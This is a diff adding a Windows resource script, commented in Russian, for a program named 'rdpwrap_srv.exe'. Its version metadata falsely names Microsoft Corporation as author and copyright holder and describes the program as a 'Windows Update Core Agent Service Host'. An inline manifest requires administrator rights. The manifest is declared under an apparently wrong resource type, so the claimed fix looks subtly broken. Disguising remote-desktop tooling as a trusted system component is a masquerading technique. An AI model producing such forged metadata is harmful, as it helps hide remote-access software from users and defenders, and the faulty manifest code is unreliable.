@@ -1,0 +1,68 @@
+#pragma code_page(65001) // Установка кодировки UTF-8 для корректной кириллицы
+#include <windows.h>
+
+// ============================================================================
+// 1. ИНФОРМАЦИЯ О ВЕРСИИ ФАЙЛА (Для Проводника и Свойств файла)
+// ============================================================================
+VS_VERSION_INFO VERSIONINFO
+FILEVERSION     10,0,26100,1
+PRODUCTVERSION  10,0,26100,1
+FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
+FILEFLAGS       0x0L
+FILEOS          VOS_NT_WINDOWS32
+FILETYPE        VFT_APP
+FILESUBTYPE     0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "041904b0" // Блок данных на русском языке (Юникод)
+        BEGIN
+            VALUE "CompanyName",      "Microsoft Corporation"
+            VALUE "FileDescription",  "Windows Update Core Agent Service Host"
+            VALUE "FileVersion",      "10.0.26100.1 (WinBuild.160101.0800)"
+            VALUE "InternalName",     "rdpwrap_srv.exe"
+            VALUE "LegalCopyright",   "© Microsoft Corporation. Все права защищены."
+            VALUE "OriginalFilename", "rdpwrap_srv.exe"
+            VALUE "ProductName",      "Microsoft® Windows® Operating System"
+            VALUE "ProductVersion",   "10.0.26100.1"
+        END
+
+        BLOCK "040904b0" // Блок данных на английском языке (Юникод)
+        BEGIN
+            VALUE "CompanyName",      "Microsoft Corporation"
+            VALUE "FileDescription",  "Windows Update Core Agent Service Host"
+            VALUE "FileVersion",      "10.0.26100.1 (WinBuild.160101.0800)"
+            VALUE "InternalName",     "rdpwrap_srv.exe"
+            VALUE "LegalCopyright",   "© Microsoft Corporation. All rights reserved."
+            VALUE "OriginalFilename", "rdpwrap_srv.exe"
+            VALUE "ProductName",      "Microsoft® Windows® Operating System"
+            VALUE "ProductVersion",   "10.0.26100.1"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x419, 1200, 0x409, 1200 // Поддержка двуязычного Проводника
+    END
+END
+
+// ============================================================================
+// 2. СИСТЕМНЫЙ МАНИФЕСТ ПРИЛОЖЕНИЯ (Инлайновое внедрение без внешних файлов)
+// ============================================================================
+// Фикс: Внедряем XML-структуру напрямую. Это решает проблему "No such file or directory" в Ninja.
+1 RESTRUCT {
+"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\r\n"
+"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>\r\n"
+"  <compatibility xmlns='urn:schemas-microsoft-com:compatibility.v1'>\r\n"
+"    <application>\r\n"
+"      <supportedOS Id='{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}'/>\r\n"
+"    </application>\r\n"
+"  </compatibility>\r\n"
+"  <trustInfo xmlns='urn:schemas-microsoft-com:asm.v3'>\r\n"
+"    <security>\r\n"
+"      <requestedPrivileges>\r\n"
+"        <requestedExecutionLevel level='requireAdministrator' uiAccess='false'/>\r\n"
+"      </requestedPrivileges>\r\n"
+"    </security>\r\n"
+"  </trustInfo>\r\n"
+"</assembly>\r\n"
+}
